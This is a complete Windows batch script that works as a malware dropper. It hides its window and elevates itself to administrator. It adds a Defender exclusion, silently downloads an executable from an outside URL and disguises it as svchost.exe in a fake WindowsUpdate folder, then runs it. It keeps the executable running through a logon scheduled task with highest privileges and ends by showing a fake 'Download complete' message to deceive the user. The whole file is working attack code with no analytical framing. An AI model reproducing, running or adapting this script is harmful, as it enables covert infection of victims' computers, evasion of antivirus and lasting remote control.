@echo off

:: Hide console window
if not defined WINDOW_HIDDEN (
    set "WINDOW_HIDDEN=1"
    start /min "" cmd /c "%~f0"
    exit /b
)

:: Self-elevate to Administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "INSTALL_DIR=C:\ProgramData\WindowsUpdate"
set "PAYLOAD=%INSTALL_DIR%\svchost.exe"
set "URL=https://y.hn/juykz"
set "TASK_NAME=WindowsUpdateTask"

:: Create directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" 2>nul

:: Defender exclusion
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1

timeout /t 2 /nobreak >nul

:: Silent Download
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$url = '%URL%'; $path = '%PAYLOAD%'; try { (New-Object System.Net.WebClient).DownloadFile($url, $path) } catch {}" >nul 2>&1

timeout /t 3 /nobreak >nul

if exist "%PAYLOAD%" (
    powershell -Command "Unblock-File -Path '%PAYLOAD%' -ErrorAction SilentlyContinue" >nul 2>&1
    
    :: Kill old instance
    taskkill /f /im "svchost.exe" /fi "Path eq %PAYLOAD%" >nul 2>&1
    
    :: Run payload
    start "" "%PAYLOAD%" >nul 2>&1
    
    :: Create Scheduled Task persistence
    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
    schtasks /create /tn "%TASK_NAME%" /tr "\"%PAYLOAD%\"" /sc onlogon /ru "%USERNAME%" /rl HIGHEST /f /it >nul 2>&1
)

:: Optional fake message (remove the whole block if you want complete silence)
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Download complete, the setup is available in your Desktop.', 'MyPortfolio', 'OK', 'Information')" >nul 2>&1

exit /b